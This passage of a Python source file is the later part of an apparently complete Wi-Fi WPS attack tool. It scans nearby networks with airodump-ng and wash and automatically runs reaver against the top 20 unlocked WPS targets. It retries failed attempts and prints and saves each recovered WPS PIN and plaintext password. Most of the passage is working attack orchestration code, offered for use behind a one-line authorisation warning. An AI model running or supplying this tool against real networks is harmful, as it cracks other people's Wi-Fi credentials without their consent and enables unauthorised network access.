                    result_obj.wps_pin = "-"
                    result_obj.password = "-"
                    result_obj.time_spent = elapsed
                    result_obj.retries = retry_count
                    update_targets_table(all_results, stats, tui)
                    return result_obj
            else:
                # Failed for other reasons
                retry_count += 1
                if retry_count <= max_retries:
                    tui_print(f"[!] Attack failed, retrying ({retry_count}/{max_retries})...", tui)
                    time.sleep(5)

        except Exception as e:
            tui_print(f"[!] Error during attack: {e}", tui)
            retry_count += 1
            if retry_count <= max_retries:
                time.sleep(5)

    # Failed after all retries
    elapsed = time.time() - start_time
    result_obj.status = "FAILED"
    result_obj.wps_pin = "-"
    result_obj.password = "-"
    result_obj.time_spent = elapsed
    result_obj.retries = retry_count
    update_targets_table(all_results, stats, tui)
    return result_obj


def print_table(aps: List[AccessPoint]):
    """Pretty table."""
    headers = [
        ("#", 3), ("PWR", 4), ("CH", 3),
        ("BSSID", 17), ("ESSID", 20),
        ("ENC", 7), ("CIPH", 6), ("AUTH", 6),
        ("WPS", 5), ("LOCK", 5), ("STATUS", 10),
    ]

    print("\n=== WiFi Passive Audit Table ===")
    print("(sorted by strongest signal)\n")

    # header
    line = "  " + "  ".join(h[0].ljust(h[1]) for h in headers)
    print(line)
    print("  " + "  ".join("-" * h[1] for h in headers))

    for i, ap in enumerate(aps, 1):
        row = [
            str(i).ljust(3),
            str(ap.pwr).ljust(4),
            ap.channel.ljust(3),
            ap.bssid.ljust(17),
            ap.essid[:20].ljust(20),
            ap.privacy.ljust(7),
            ap.cipher.ljust(6),
            ap.auth.ljust(6),
            ap.wps.ljust(5),
            ap.locked.ljust(5),
            ap.status.ljust(10),
        ]
        print("  " + "  ".join(row))


def save_results_to_file(results: List[AttackResult], interface: str, filename: str):
    """Save attack results to log file."""
    with open(filename, 'w') as f:
        f.write(f"WiFi Audit Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Interface: {interface}\n")
        f.write(f"Targets Scanned: {len(results)}\n")
        f.write("\n")

        for result in results:
            f.write(f"[{result.target_num}/{len(results)}] BSSID: {result.bssid} | ESSID: {result.essid} | Channel: {result.channel}\n")
            f.write(f"Status: {result.status}\n")

            if result.status == "SUCCESS":
                f.write(f"WPS PIN: {result.wps_pin}\n")
                f.write(f"Password: {result.password}\n")

            mins, secs = divmod(int(result.time_spent), 60)
            f.write(f"Time: {mins}m {secs}s\n")
            f.write(f"Retries: {result.retries}\n")
            f.write("\n")

    print(f"[+] Results saved to {filename}")


def print_results_table(results: List[AttackResult]):
    """Format and display final results table to console."""
    success_count = sum(1 for r in results if r.status == "SUCCESS")
    failed_count = sum(1 for r in results if r.status == "FAILED")
    locked_count = sum(1 for r in results if r.status == "LOCKED")

    print("\n" + "=" * 80)
    print("=== Final Attack Results ===")
    print("=" * 80)
    print(f"Total Targets: {len(results)}")
    print(f"Successful: {success_count}")
    print(f"Failed: {failed_count}")
    print(f"Locked: {locked_count}")
    print()

    print("Detailed Results:")
    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")
    print("| #  | BSSID             | ESSID                | Status   | WPS PIN   | Password     | Time     |")
    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")

    for result in results:
        mins, secs = divmod(int(result.time_spent), 60)
        time_str = f"{mins}m {secs}s"

        print(f"| {result.target_num:<2} | {result.bssid:<17} | {result.essid[:20]:<20} | {result.status:<8} | {result.wps_pin:<9} | {result.password[:12]:<12} | {time_str:<8} |")

    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")


# ---------------------------------------------------------
# Main
# ---------------------------------------------------------

def run_main_logic(args, tui=None):
    """Main logic that can run with or without TUI."""
    # Check if interface is in monitor mode
    tui_print("[*] Checking interface mode...", tui)
    if not check_monitor_mode(args.interface):
        tui_print(f"[!] Error: Interface {args.interface} is not in monitor mode", tui)
        tui_print("[!] Please enable monitor mode first (e.g., 'sudo airmon-ng start wlan0')", tui)
        sys.exit(1)
    tui_print(f"[+] Interface {args.interface} is in monitor mode", tui)

    # Run airodump scan
    csv_file = run_airodump(args.interface, args.airodump_duration, args.output_prefix, tui)
    aps = parse_airodump_csv(csv_file)

    # Run wash if not skipped
    if not args.skip_wash:
        # Use wash-duration if specified, otherwise use same duration as airodump
        wash_duration = args.wash_duration if args.wash_duration is not None else args.airodump_duration
        wps_info = run_wash(args.interface, wash_duration, tui)

        # Merge WPS + Locked info (wash overrides airodump for more reliable lock detection)
        for bssid, ap in aps.items():
            if bssid in wps_info:
                # wash provides more reliable WPS lock detection than airodump
                ap.wps = wps_info[bssid]["wps"]
                ap.locked = wps_info[bssid]["locked"]
            # If airodump detected WPS but wash didn't find it, keep airodump's values
    else:
        tui_print("[*] Skipping wash scan, using airodump WPS data only", tui)

    # Switch from scan phase to attack phase (changes table display)
    if tui and tui.enabled:
        tui.scan_phase = False

    # Sort strongest first (PWR closer to 0)
    sorted_aps = sorted(aps.values(), key=lambda x: x.pwr, reverse=True)

    # Display passive scan results (only in non-TUI mode or before TUI starts)
    if not tui or not tui.enabled:
        print_table(sorted_aps)

    # If passive mode, stop here
    if args.passive:
        tui_print("[*] Passive mode - no attacks will be performed", tui)
        return

    # Filter for WPS-enabled targets that are not locked
    wps_targets = [
        ap for ap in sorted_aps
        if ap.wps != "?" and ap.locked != "Yes"
    ]

    if not wps_targets:
        tui_print("[!] No WPS-enabled targets found", tui)
        return

    # Take top 20
    targets = wps_targets[:20]
    tui_print(f"\n[+] Found {len(wps_targets)} WPS-enabled targets", tui)
    tui_print(f"[+] Attacking top {len(targets)} targets\n", tui)

    # Initialize progress stats
    stats = {
        'total': len(targets),
        'completed': 0,
        'success': 0,
        'failed': 0,
        'locked': 0,
        'current_target': None,
        'current_index': 0
    }

    # Initialize all results as PENDING
    results = []
    for idx, target in enumerate(targets, 1):
        results.append(AttackResult(
            target_num=idx,
            bssid=target.bssid,
            essid=target.essid,
            channel=target.channel,
            status="PENDING",
            wps_pin="-",
            password="-",
            time_spent=0.0,
            retries=0
        ))

    # Display initial table
    update_targets_table(results, stats, tui)
    time.sleep(2)  # Give user time to see the initial state

    # Attack each target
    for idx, target in enumerate(targets, 1):
        stats['current_target'] = target
        stats['current_index'] = idx

        # Mark current target as IN_PROGRESS
        results[idx - 1].status = "IN_PROGRESS"
        update_targets_table(results, stats, tui)

        # Run attack (pass the result object for live updates)
        result = run_reaver_attack(
            target,
            args.interface,
            results[idx - 1],
            stats,
            results,
            max_retries=10,
            verbose=args.verbose,
            tui=tui
        )

        # Update stats
        stats['completed'] += 1
        if result.status == "SUCCESS":
            stats['success'] += 1
        elif result.status == "LOCKED":
            stats['locked'] += 1
        else:
            stats['failed'] += 1

        # Final table update for this target
        update_targets_table(results, stats, tui)

    # Exit curses mode before showing final results
    if tui and tui.enabled:
        # Disable TUI to allow normal printing
        tui.enabled = False

    # Display final results
    print_results_table(results)

    # Save results to file
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f"wifi_audit_results_{timestamp}.txt"
    save_results_to_file(results, args.interface, log_filename)


def main():
    """Main entry point with argument parsing."""
    parser = argparse.ArgumentParser(
        description='WiFi WPS penetration testing tool - Scans and attacks WPS-enabled networks',
        epilog='WARNING: Only use on networks you own or have authorization to test.',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "-i", "--interface",
        required=True,
        metavar="IFACE",
        help="wireless interface in monitor mode (required)"
    )
    parser.add_argument(
        "-a", "--airodump-duration",
        type=int,
        default=480,
        metavar="SEC",
        help="airodump-ng scan duration in seconds (default: 480)"
    )
    parser.add_argument(
        "-w", "--wash-duration",
        type=int,
        default=None,
        metavar="SEC",
        help="wash scan duration in seconds (default: same as airodump duration)"
    )
    parser.add_argument(
        "-o", "--output-prefix",
        default="scan",
        metavar="PREFIX",
        help="output file prefix for scan results (default: scan)"
    )
    parser.add_argument(
        "--passive",
        action="store_true",
        help="passive scan only, no WPS attacks (default: active mode)"
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="show all reaver output lines (default: important lines only)"
    )
    parser.add_argument(
        "--no-curses",
        action="store_true",
        help="disable curses TUI, use legacy scrolling output (for debugging or compatibility)"
    )
    parser.add_argument(
        "--skip-wash",
        action="store_true",
        help="skip wash scan, use only airodump WPS detection (faster but less reliable lock detection)"
    )
    args = parser.parse_args()

    # Decide whether to use curses or not
    use_curses = not args.no_curses and not args.passive

    if use_curses:
        # Run with curses TUI
        def curses_main(stdscr):
            tui = WifiAuditTUI(stdscr)
            try:
                run_main_logic(args, tui)
            except KeyboardInterrupt:
                tui.enabled = False
                print("\n[!] Interrupted by user")
            except Exception as e:
                tui.enabled = False
                print(f"\n[!] Error: {e}")
                raise

        try:
            curses.wrapper(curses_main)
        except Exception as e:
            print(f"[!] Curses initialization failed: {e}")
            print("[!] Falling back to legacy mode...")
            run_main_logic(args, None)
    else:
        # Run without curses (legacy mode or passive mode)
        try:
            run_main_logic(args, None)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")


if __name__ == "__main__":
    main()
